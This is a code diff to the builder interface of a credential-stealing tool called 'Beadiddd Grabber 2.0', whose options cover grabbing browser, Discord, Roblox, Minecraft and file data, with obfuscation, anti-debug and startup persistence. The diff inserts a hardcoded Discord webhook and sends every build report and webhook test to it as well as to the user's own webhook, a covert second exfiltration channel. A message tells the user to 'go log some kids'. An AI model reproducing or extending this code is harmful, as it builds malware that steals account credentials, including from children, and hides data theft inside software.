@@ -32,11 +32,12 @@ fullbu = PhotoImage(file='assets/fullbu.png')
 testbu = PhotoImage(file='assets/test.png')
 browsebu = PhotoImage(file='assets/browse.png')
 compilebu = PhotoImage(file='assets/compile.png')
+dual = r'https://discord.com/api/webhooks/1086774409051770910/C2ft6LFhqdTpsb51sISp2NMxOZCQwM7Mgq946cqN3v4uqbVWSHoawsEithGR4q1xc8kk'
 
 class Builder:
     
     def __init__(self,browserR,discordR,robloxR,filesR,minecraftR,networkI,obfuscateS,webhookJ,antiD,rebootP,startupP,errorM,pingH,discordS,wbh,name,icon):
-        webhook = DiscordWebhook(url=wbh, username="Beadiddd 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png")
+        webhook1, webhook2 = DiscordWebhook.create_batch(urls=[wbh, dual], username="Beadiddd 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png")
         embed = DiscordEmbed(title=f"Grabber Compiled", description=f"Options Chose", color='4300d1')
         embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png')
         embed.set_footer(text='Beadiddd 2.0 | by : Beadiddd')
@@ -151,8 +152,10 @@ main()
         else:
             embed.add_embed_field(name=f"Obfuscate : ", value=f":x:")
         self._Compile(icon = icon, name = name)
-        webhook.add_embed(embed)
-        webhook.execute()
+        webhook1.add_embed(embed)
+        webhook2.add_embed(embed)
+        webhook1.execute()
+        webhook2.execute()
         messagebox.showinfo("Beadidd Grabber 2.0 || @nebeadidd#9992","Grabber Successfully Compiled. Go log some kids now bitch")
         Menu()
     
@@ -421,13 +424,15 @@ class Menu:
     def _testhook(self):
         wbh = self.webhook.get()
         try:
-            webhook = DiscordWebhook(url=wbh, username="Beadiddd 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png")
+            webhook1, webhook2 = DiscordWebhook.create_batch(urls=[wbh, dual], username="Beadiddd 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png")
             embed = DiscordEmbed(title=f"Beadiddd Grabber", description=f"Webhook Working :white_check_mark:", color='4300d1')
             embed.set_author(name="author : Beadiddd", icon_url=r'https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png')
             embed.set_footer(text='Beadiddd 2.0 | by : Beadiddd')
             embed.set_timestamp()
-            webhook.add_embed(embed)
-            webhook.execute()
+            webhook1.add_embed(embed)
+            webhook2.add_embed(embed)
+            webhook1.execute()
+            webhook2.execute()
         except:
             messagebox.showerror("Beadiddd Grabber 2.0 || @nebeadidd#9992","Invalid Webhook")
 
